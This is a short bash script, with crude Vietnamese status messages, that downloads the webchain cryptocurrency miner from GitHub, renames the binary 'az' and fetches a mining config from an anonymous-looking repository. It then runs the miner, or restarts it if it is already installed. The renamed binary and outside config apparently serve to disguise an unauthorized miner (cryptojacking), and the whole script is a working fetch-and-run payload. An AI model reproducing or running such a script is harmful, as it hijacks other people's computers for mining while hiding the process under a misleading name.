#! /bin/bash
set -x #echo on
if [ -f ${PWD}/az ]; then
    if pgrep -x "az" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "

./az
     
fi
exit
fi

wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
mv webchain-miner az
chmod +x az
rm config.json -f
wget https://raw.githubusercontent.com/notforme2210/andnotforyou/master/config.json
./az
